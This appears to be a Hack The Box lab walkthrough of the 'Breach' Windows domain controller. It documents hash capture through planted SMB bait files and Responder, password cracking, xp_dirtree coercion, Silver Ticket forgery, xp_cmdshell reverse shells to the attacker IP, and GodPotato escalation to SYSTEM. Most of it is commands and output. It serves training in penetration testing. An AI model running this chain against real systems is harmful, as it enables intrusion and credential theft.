---
title: "Hack The Box: Breach"
date: 2025-11-22
summary: "A Medium Windows-based machine where the target is compromised by abusing guest write permissions on an SMB share to upload malicious files, capturing an NTLMv2 hash via Responder. After cracking the user credentials, forcing NTLM authentication via xp_dirtree in MSSQL exposes the svc_mssql service hash, enabling Silver Ticket forgery to gain DBA access and command execution. Finally, privilege escalation is achieved by abusing SeImpersonatePrivilege with GodPotato for SYSTEM access."
platform: "Hack The Box"
type: "Offensive Machine"
os: "Windows"
difficulty: "Medium"
link: "https://app.hackthebox.com/machines/Breach"
tags:
  - active-directory
  - file-upload-attacks
  - g-potato
  - impacket-getuserspns
  - impacket-lookupsid
  - impacket-mssqlclient
  - impacket-ticketer
  - john
  - mssql-xp-cmdshell
  - netcat
  - netexec
  - nmap
  - ntlm-stealing
  - ntlm-theft
  - pypykatz
  - responder
  - reverse-shell
  - seimpersonateprivilege
  - silver-ticket
  - smbclient
---

### Provided Information

"The User flag for this Box is located in a non-standard directory, `C:\share\transfer\`."

### Nmap Scan

```bash
$ nmap -sCV -vv -oA nmap/top-tcp 10.129.209.79
Nmap scan report for 10.129.209.79
Host is up, received echo-reply ttl 127 (0.20s latency).
Scanned at 2025-11-22 10:33:57 +04 for 75s
Not shown: 985 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-11-22 02:33:49Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info:
|   10.129.209.79:1433:
|     Target_Name: BREACH
|     NetBIOS_Domain_Name: BREACH
|     NetBIOS_Computer_Name: BREACHDC
|     DNS_Domain_Name: breach.vl
|     DNS_Computer_Name: BREACHDC.breach.vl
|     DNS_Tree_Name: breach.vl
|_    Product_Version: 10.0.20348
|_ssl-date: 2025-11-22T02:34:42+00:00; -4h00m24s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-22T02:22:59
| Not valid after:  2055-11-22T02:22:59
| MD5:   4c45:48a1:cc89:de40:f838:ffac:f503:a327
| SHA-1: 4646:2ed6:2fff:842f:d54a:1e64:d0a4:ede5:1c77:d395
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
| ms-sql-info:
|   10.129.209.79:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: BREACH
|   NetBIOS_Domain_Name: BREACH
|   NetBIOS_Computer_Name: BREACHDC
|   DNS_Domain_Name: breach.vl
|   DNS_Computer_Name: BREACHDC.breach.vl
|   DNS_Tree_Name: breach.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-22T02:34:02+00:00
| ssl-cert: Subject: commonName=BREACHDC.breach.vl
| Issuer: commonName=BREACHDC.breach.vl
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-09-07T08:04:48
| Not valid after:  2026-03-09T08:04:48
| MD5:   f457:54f6:0073:10ba:ecb2:0f99:fca9:d035
| SHA-1: ccc9:9cbf:5171:71cb:42e1:4951:243c:e58c:a229:cd36
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-11-22T02:34:43+00:00; -4h00m24s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: BREACHDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59232/tcp): CLEAN (Timeout)
|   Check 2 (port 57543/tcp): CLEAN (Timeout)
|   Check 3 (port 14132/udp): CLEAN (Timeout)
|   Check 4 (port 55713/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -4h00m24s, deviation: 0s, median: -4h00m24s
| smb2-time:
|   date: 2025-11-22T02:34:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
<SNIP>
```

The target is a Domain Controller given the running services.

### Enumerating SMB

Let’s start by enumerating SMB shares with `netexec` using null/guest authentication.

First, let’s check if null/guest authentication is allowed:

```bash
$ netexec smb 10.129.209.79 -u '' -p ''
SMB         10.129.209.79   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.209.79   445    BREACHDC         [+] breach.vl\:
```

It is.

Let’s create a hosts file to append to `/etc/hosts`:

```bash
$ netexec smb 10.129.209.79 -u '' -p '' --generate-hosts-file hosts
SMB         10.129.209.79   445    BREACHDC         [*] Windows Server 
2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) 
(SMBv1:False)
SMB         10.129.209.79   445    BREACHDC         [+] breach.vl\:

$ cat hosts | sudo tee -a /etc/hosts
10.129.209.79     BREACHDC.breach.vl breach.vl BREACHDC
```

Now let’s enumerate shares:

```bash
$ netexec smb breach.vl -u '' -p '' --shares
SMB         10.129.209.79   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.209.79   445    BREACHDC         [+] breach.vl\:
SMB         10.129.209.79   445    BREACHDC         [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Null authentication isn’t allowed for SMB share enumeration.

Let’s try with guest authentication:

```bash
$ netexec smb breach.vl -u guest -p '' --shares
SMB         10.129.209.79   445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)
SMB         10.129.209.79   445    BREACHDC         [+] breach.vl\guest:
SMB         10.129.209.79   445    BREACHDC         [*] Enumerated shares
SMB         10.129.209.79   445    BREACHDC         Share           Permissions     Remark
SMB         10.129.209.79   445    BREACHDC         -----           -----------     ------
SMB         10.129.209.79   445    BREACHDC         ADMIN$                          Remote Admin
SMB         10.129.209.79   445    BREACHDC         C$                              Default share
SMB         10.129.209.79   445    BREACHDC         IPC$            READ            Remote IPC
SMB         10.129.209.79   445    BREACHDC         NETLOGON                        Logon server share
SMB         10.129.209.79   445    BREACHDC         share           READ,WRITE
SMB         10.129.209.79   445    BREACHDC         SYSVOL                          Logon server share
SMB         10.129.209.79   445    BREACHDC         Users           READ
```

Guest is allowed to enumerate shares.

There are two non-default shares: “share” and “Users”.

Let’s check “share” first using `smbclient`:

```bash
$ smbclient //breach.vl/share -U "guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 22 06:35:03 2025
  ..                                DHS        0  Tue Sep  9 14:35:32 2025
  finance                             D        0  Thu Feb 17 15:19:34 2022
  software                            D        0  Thu Feb 17 15:19:12 2022
  transfer                            D        0  Mon Sep  8 14:13:44 2025
```

This seems to be a hierarchy of folders, so let’s download all of them recursively:

```bash
$ smbclient //breach.vl/share -U "guest%"
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
NT_STATUS_ACCESS_DENIED listing \transfer\claire.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\diana.pope\*
NT_STATUS_ACCESS_DENIED listing \transfer\julia.wong\*
```

```bash
$ tree .
.
├── finance
├── software
└── transfer
    ├── claire.pope
    ├── diana.pope
    └── julia.wong
```

So guest isn’t allowed to enumerate deep enough, yet at least we’ve got some usernames.

Let’s check the other share:

```bash
$ smbclient //breach.vl/Users -U "guest%"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Feb 17 17:12:16 2022
  ..                                DHS        0  Tue Sep  9 14:35:32 2025
  Default                           DHR        0  Thu Feb 10 13:10:33 2022
  desktop.ini                       AHS      174  Sat May  8 12:18:31 2021
  Public                             DR        0  Wed Sep 15 07:08:59 2021

                7863807 blocks of size 4096. 1478964 blocks available
smb: \> cd Public
smb: \Public\> ls
  .                                  DR        0  Wed Sep 15 07:08:59 2021
  ..                                 DR        0  Thu Feb 17 17:12:16 2022
  AccountPictures                   DHR        0  Thu Feb 17 17:12:33 2022
  desktop.ini                       AHS      174  Sat May  8 12:18:31 2021
  Documents                          DR        0  Thu Aug 19 03:34:55 2021
  Downloads                          DR        0  Sat May  8 12:20:26 2021
  Libraries                         DHR        0  Sat May  8 12:34:49 2021
  Music                              DR        0  Sat May  8 12:20:26 2021
  Pictures                           DR        0  Sat May  8 12:20:26 2021
  Videos                             DR        0  Sat May  8 12:20:26 2021
```

This seems to be `C:\Users\` directory.

Let’s download all files recursively:

```bash
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
<SNIP>
```

```bash
$ tree -a .
.
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── Windows
│   │   │   │   │   ├── Caches
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   │   ├── desktop.ini
│   │   │   │   │   │   └── History.IE5
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── PowerShell
│   │   │   │   │   │   └── StartupProfileData-Interactive
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   ├── UsrClass.dat
│   │   │   │   │   ├── UsrClass.dat{daabe3c8-007c-11ec-b8eb-f348435aa013}.TM.blf
│   │   │   │   │   ├── UsrClass.dat{daabe3c8-007c-11ec-b8eb-f348435aa013}.TMContainer00000000000000000001.regtrans-ms
│   │   │   │   │   ├── UsrClass.dat{daabe3c8-007c-11ec-b8eb-f348435aa013}.TMContainer00000000000000000002.regtrans-ms
│   │   │   │   │   ├── UsrClass.dat.LOG1
│   │   │   │   │   ├── UsrClass.dat.LOG2
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   ├── LocalLow
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── desktop.ini
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   └── Desktop.ini
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── Startup
│   │               │       │   └── setwallpaper.lnk
│   │               │       └── System Tools
│   │               │           ├── Administrative Tools.lnk
│   │               │           ├── Command Prompt.lnk
│   │               │           ├── computer.lnk
│   │               │           ├── Control Panel.lnk
│   │               │           ├── Desktop.ini
│   │               │           ├── File Explorer.lnk
│   │               │           └── Run.lnk
│   │               └── Templates
│   ├── Desktop
│   │   ├── EC2 Feedback.website
│   │   └── EC2 Microsoft Windows Guide.website
│   ├── Documents
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Music
│   ├── NTUSER.DAT
│   ├── ntuser.ini
│   ├── Pictures
│   ├── Saved Games
│   └── Videos
├── desktop.ini
└── Public
    ├── AccountPictures
    │   └── desktop.ini
    ├── desktop.ini
    ├── Documents
    │   └── desktop.ini
    ├── Downloads
    │   └── desktop.ini
    ├── Libraries
    │   ├── desktop.ini
    │   └── RecordedTV.library-ms
    ├── Music
    │   └── desktop.ini
    ├── Pictures
    │   └── desktop.ini
    └── Videos
        └── desktop.ini
```

Nothing too interesting.

### Exploiting Julia

Since the “share” share is writeable, let’s try the following: Uploading files that point back to the attacker machine such that when any user interacts with any of these files, their hash is sent back to the attacker.

For this, let’s use [ntlm_theft](https://github.com/Greenwolf/ntlm_theft):

```bash
$ python3 ntlm_theft.py -g all -s 10.10.14.125 -f benign
<SNIP>
Created: benign/benign.scf (BROWSE TO FOLDER)
Created: benign/benign-(url).url (BROWSE TO FOLDER)
Created: benign/benign-(icon).url (BROWSE TO FOLDER)
Created: benign/benign.lnk (BROWSE TO FOLDER)
Created: benign/benign.rtf (OPEN)
Created: benign/benign-(stylesheet).xml (OPEN)
Created: benign/benign-(fulldocx).xml (OPEN)
Created: benign/benign.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: benign/benign-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: benign/benign-(includepicture).docx (OPEN)
Created: benign/benign-(remotetemplate).docx (OPEN)
Created: benign/benign-(frameset).docx (OPEN)
Created: benign/benign-(externalcell).xlsx (OPEN)
Created: benign/benign.wax (OPEN)
Created: benign/benign.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: benign/benign.asx (OPEN)
Created: benign/benign.jnlp (OPEN)
Created: benign/benign.application (DOWNLOAD AND OPEN)
Created: benign/benign.pdf (OPEN AND ALLOW)
Created: benign/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: benign/benign.library-ms (BROWSE TO FOLDER)
Created: benign/Autorun.inf (BROWSE TO FOLDER)
Created: benign/desktop.ini (BROWSE TO FOLDER)
Created: benign/benign.theme (THEME TO INSTALL
Generation Complete.
```

This created files of many types, all pointing to the attacker machine.

Let’s start `responder` before uploading them:

```bash
$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>
[+] Listening for events...
```

Now let’s connect to the share and upload them to all accessible folders:

```bash
smb: \transfer\> prompt off
smb: \transfer\> mput *
<SNIP>
```

After few moments, an NTLMv2 hash belonging to Julia.Wong is captured:

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.209.79
[SMB] NTLMv2-SSP Username : BREACH\Julia.Wong
[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:838e83dacbae34c4:4E2119<REDACTED>
```

Nice. Let’s attempt cracking it with `john`:

```bash
$ echo 'Julia.Wong::BREACH:838e83dacbae34c4:4E2119<REDACTED>' > julia.hash

$ john julia.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
Com<REDACTED>      (Julia.Wong)
<SNIP>
```

Success! We got credentials.

Remember from previous enumeration of the “share” share that it had a restricted directory for many users, one of which is Julia.

Let’s try accessing it with the newly found credentials:

```bash
$ smbclient //breach.vl/share -U "Julia.Wong%Com<REDACTED>"
Try "help" to get a list of possible commands.
smb: \> cd transfer
smb: \transfer\> ls
  .                                   D        0  Sat Nov 22 07:00:24 2025
  ..                                  D        0  Sat Nov 22 06:35:03 2025
<SNIP>
  julia.wong                          D        0  Thu Apr 17 04:38:12 2025
<SNIP>

                7863807 blocks of size 4096. 1516285 blocks available
smb: \transfer\> cd julia.wong
smb: \transfer\julia.wong\> ls
  .                                   D        0  Thu Apr 17 04:38:12 2025
  ..                                  D        0  Sat Nov 22 07:00:24 2025
  user.txt                            A       32  Thu Apr 17 04:38:22 2025

                7863807 blocks of size 4096. 1516285 blocks available
```

Let’s get that `user.txt` flag and read it:

```bash
smb: \transfer\julia.wong\> get user.txt
getting file \transfer\julia.wong\user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \transfer\julia.wong\> exit

$ cat user.txt
55d33e<REDACTED>
```

### Exploiting Svc_mssql

Let’s see if Julia is able to access MSSQL:

```bash
$ netexec mssql breach.vl -u Julia.Wong -p Com<REDACTED>
MSSQL       10.129.209.79   1433   BREACHDC         [*] Windows Server 2022 Build 20348 (name:BREACHDC) (domain:breach.vl)
MSSQL       10.129.209.79   1433   BREACHDC         [+] breach.vl\Julia.Wong:Com<REDACTED>
```

Nice, it can.

Let’s log into MSSQL as Julia using `impacket-mssqlclient` and check available databases:

```bash
$ impacket-mssqlclient breach.vl/Julia.Wong:'Com<REDACTED>'@BREACHDC.breach.vl -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Julia.Wong  guest@master)> SELECT name FROM sys.databases;
name
------
master

tempdb

model

msdb
```

Nothing too interesting.

Let’s attempt to access a nonexistent share on the attacker machine, to force the DB user to leak its hash.

Before that, let’s start `responder`:

```bash
$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>
[+] Listening for events...
```

Now let’s force a connection:

```bash
SQL (BREACH\Julia.Wong  guest@master)> EXEC master..xp_dirtree '\\10.10.14.125\share'
```

```bash
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.209.79
[SMB] NTLMv2-SSP Username : BREACH\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::BREACH:bca6394e9f7d7068:C616D667<REDACTED>
```

Nice, we got that NTLMv2 hash of Svc_mssql.

Let’s attempt cracking it with `john`:

```bash
$ echo 'svc_mssql::BREACH:bca6394e9f7d7068:C616D667<REDACTED>' > mssql.hash

$ john mssql.hash -w=/usr/share/wordlists/rockyou.txt
<SNIP>
Tru<REDACTED>        (svc_mssql)
<SNIP>
```

Nice, successfully cracked.

### Silver Ticket

Since Svc_mssql is likely a service account, we can create a silver ticket to log into MSSQL using any account (such as administrator which likely can enable `xp_cmdshell` and allow RCE).

Let’s first validate that Svc_mssql has an SPN using `impacket-GetUserSPNs`:

```bash
$ impacket-GetUserSPNs breach.vl/julia.wong:Com<REDACTED> -dc-ip 10.129.209.79

Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName              Name       MemberOf  PasswordLastSet             LastLogon                   Delegation
--------------------------------  ---------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/breachdc.breach.vl:1433  svc_mssql            2022-02-17 14:43:08.106169  2025-11-22 06:22:55.376457
```

Nice, it indeed has an SPN.

Let’s create a silver ticket to impersonate the administrator against MSSQL.

The following details are needed:

- SPN of the service account: Already identified in the `impacket-GetUserSPNs` output above.
- SID of the domain: Achievable with `impacket-lookupsid`:
    
```bash
    $ impacket-lookupsid julia.wong:Com<REDACTED>@breach.vl
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
    
    [*] Brute forcing SIDs at breach.vl
    [*] StringBinding ncacn_np:breach.vl[\pipe\lsarpc]
    [*] Domain SID is: S-1-5-21-2330692793-3312915120-706255856
```
    
- NT hash of the service account: Achievable with any password-to-NT converter. `pypykatz` can do that:
    
```bash
    $ pypykatz crypto nt Tru<REDACTED>
    69596c<REDACTED>
```
    
- DC IP: Already known, `10.129.209.79`.
- Domain: Already known, `breach.vl`.
- Name and User ID of the user that we will impersonate (Administrator): Its default value in Active Directory domains is 500.

Now with the data in hand, let’s create a silver ticket using `impacket-ticketer`:

```bash
$ impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c<REDACTED> -dc-ip 10.129.209.79 -domain breach.vl -user-id 500 Administrator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for breach.vl/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in Administrator.ccache
```

Nice. Now let’s export the ticket and log into MSSQL as Administrator:

```bash
$ impacket-mssqlclient -k -no-pass breachdc.breach.vl -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(BREACHDC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (BREACH\Administrator  dbo@master)>
```

Perfect.

### RCE as Svc_mssql

Let’s try to enable `xp_cmdshell`:

```bash
SQL (BREACH\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1
INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (BREACH\Administrator  dbo@master)> RECONFIGURE
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "whoami"
output
----------------
breach\svc_mssql

NULL
```

Success!

Let’s establish a reverse shell by using a base64-encoded Powershell reverse shell from revshells.com.

Before that, let’s start `nc` on port 9001:

```bash
$ rlwrap -cAr nc -lvnp 9001
listening on [any] 9001 ...
```

Now let’s get a reverse shell:

```bash
SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQ<SNIP>"
```

```bash
listening on [any] 9001 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.209.79] 60089
whoami
breach\svc_mssql
PS C:\Windows\system32>
```

Very nice.

### SeImpersonatePrivilege

As part of post-compromise enumeration, `whoami /all` reveals that Svc_mssql has `SeImpersonatePrivilege` enabled:

```bash
PS C:\Windows\system32> whoami /all
<SNIP>

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

<SNIP>
```

This privilege has many publicly available exploits that can result in SYSTEM access with ease.

### RCE as Administrator

An example is [GP.exe](https://github.com/BeichenDream/GodPotato), so let’s use it.

First let’s download it and transfer it to the target:

```bash
$ wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
<SNIP>

$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
PS C:\Users\svc_mssql\Documents> iwr http://10.10.14.125:8000/GodPotato-NET4.exe -outfile gp.exe
```

Now let’s use it to establish another reverse shell over port 9002.

First let’s prepare `nc`:

```bash
$ rlwrap -cAr nc -lvnp 9002
listening on [any] 9002 ...
```

Now let’s use the exploit:

```bash
PS C:\Users\svc_mssql\Documents> ./gp.exe -cmd "powershell -e JABjAGwAaQ<SNIP>"
```

```bash
listening on [any] 9002 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.209.79] 60234
whoami
nt authority\system
PS C:\Users\svc_mssql\Documents>
```

Very nice.

Let’s read the `root.txt` flag in Administrator’s desktop:

```bash
PS C:\Users\svc_mssql\Documents> cd C:\Users\Administrator\Desktop
PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name                                                               
----                 -------------         ------ ----                                                               
-a----         4/17/2025  12:37 AM             32 root.txt                                                           

PS C:\Users\Administrator\Desktop> cat root.txt
fc98f4<REDACTED>
```
